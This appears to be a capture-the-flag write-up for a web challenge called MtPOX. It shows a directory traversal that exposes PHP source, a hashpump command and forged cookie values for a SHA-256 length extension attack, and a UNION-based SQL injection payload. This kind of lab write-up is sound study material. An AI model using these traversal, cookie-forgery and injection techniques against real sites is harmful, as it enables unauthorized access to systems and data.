## Step 1 - Directory Traversal

This is what the site looks like:

![Home Page](http://i.imgur.com/sZVdEiP.png)

The admin page doesn't have a login option, it just says "Sorry, not authorized."

![Admin page](http://i.imgur.com/UDhGLnJ.png)

The page also set two cookies. One named *hsh*, and one named *auth*. *auth* is a URL encoded serialized PHP boolean `b:0;`. Setting *auth* to `b:1;` does nothing. (in fact it just gets reset)

**auth:** `b%3A0%3B`

*hsh* is a hash with a length of 64 characters. sha-256 is widely used and fits that description, so it's a safe bet. This cookie is probably protecting *auth*.

**hsh:** `ef16c2bffbcf0b7567217f292f9c2a9a50885e01e002fa34db34c0bb916ed5c3`

Visiting other pages on the site exposes a directory traversal vulnerability.

![Traversal Vuln](http://i.imgur.com/R9jiqHe.png)

Substituting *index* for *admin.php* exposes the full admin.php source code.

![admin.php traversed](http://i.imgur.com/ERvPwIY.png)

The unrendered source looks like this:

	<?php
		require_once("secrets.php");
		$auth = false;
		if (isset($_COOKIE["auth"])) {
			$auth = unserialize($_COOKIE["auth"]);
			$hsh = $_COOKIE["hsh"];
			if ($hsh !== hash("sha256", $SECRET . strrev($_COOKIE["auth"]))) {
				$auth = false;
			}
		}
    	else {
			$auth = false;
			$s = serialize($auth);
			setcookie("auth", $s);
			setcookie("hsh", hash("sha256", $SECRET . strrev($s)));
		}
		if ($auth) {
			if (isset($_GET['query'])) {
        		$link = mysql_connect('localhost', $SQL_USER, $SQL_PASSWORD) or die('Could not connect: ' . mysql_error());
        		mysql_select_db($SQL_DATABASE) or die('Could not select database');
        		$qstr = mysql_real_escape_string($_GET['query']);
        		$query = "SELECT amount FROM plaidcoin_wallets WHERE id=$qstr";
        		$result = mysql_query($query) or die('Query failed: ' . mysql_error());
        		$line = mysql_fetch_array($result, MYSQL_ASSOC);
        		foreach ($line as $col_value) {
          			echo "Wallet " . $_GET['query'] . " contains " . $col_value . " coins.";
        		}
			} else {
         		echo "<html><head><title>MtPOX Admin Page</title></head>			<body>Welcome to the admin panel!<br /><br /><form name='input' action='admin.php' method='get'>Wallet ID: <input type='text' name='query'><input type='submit' value='Submit Query'></form></body></html>";
			}
    	}
    	else echo "Sorry, not authorized.";
	?>

Taking a closer look at the source code confirms some previous suspicions and reveals how the *auth* cookie is created and checked. Retrieving the contents of *secrets.php* should be enough to forge new cookies!

![forbidden sauce](http://i.imgur.com/wmLNBDA.png)

What the hell! The source code of *secrets.php* isn't visible. The source of index.php reveals that The Plague had actually taken *some* precautionary measures to keep his secrets hidden. 

	if (strstr($_GET['page'], "secrets")) { echo "ERROR!\n"; }

Time to get creative.

## Step 2 - Hash Length Extension

There are several factors that have come into play here that make HLE possible.

1. SHA-256 is vulnerable to hash length extension attacks.

2. PHP unserialization will accept a valid input and ignore any data after the `;`. This means the *auth* cookie will always work as long as it starts with `b:0;` or `b:1;`.

3. The string at the end of the hashed text is reversed. This means any backwards data added to *hsh* will be at the beginning of the *auth* cookie.

4. The length of the key is known, or enough time is available to bruteforce it. (A little recon on the *about* page reveals the length to be 8)

Recommended reading:

* https://blog.skullsecurity.org/2012/everything-you-need-to-know-about-hash-length-extension-attacks 
* http://en.wikipedia.org/wiki/Length\_extension\_attack

[hashpump](https://github.com/bwall/HashPump) can do the heavy lifting for us. 

	$ ./hashpump -s "ef16c2bffbcf0b7567217f292f9c2a9a50885e01e002fa34db34c0bb916ed5c3" -d ";0:b" -a ";1:b" -k 8
    
    967ca6fa9eacfe716cd74db1b1db85800e451ca85d29bd27782832b9faa16ae1

	;0:b\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00`;1:b

The hash that hashpump outputs is the new *hsh*, and the second string is the new, reversed, hex-encoded *auth* string, which needs to be turned the right way around and URL-encoded.

This is what the *auth* cookie looks like the right way around, and properly encoded.

	b%3A1%3B`%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%80b%3A0%3B
    
Plug these in for the cookie values and suddenly *admin.php* looks like this:

![Admin Panel](http://i.imgur.com/DZhJJmz.png)

The only working ID is 0. All others return a blank page.

![1333337 coins](http://i.imgur.com/2QJzuD0.png)

## Step 3 - SQL Injection

At this point it makes sense to go back and look at *admin.php* some more. mysql_real_escape_strings() won't help you here, Mr. The Plague. In fact, just submitting the form without putting anything in the text box returns a SQL error.

	Query failed: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' at line 1
    
The input box expects a numerical ID, but what goes after the ID is up to the creative problem solver.

From this point on, finding the key just takes some probing. The final query is quite simple:

	1 UNION SELECT id FROM plaidcoin_wallets
    
![Win.](http://i.imgur.com/Im7rPxl.png)
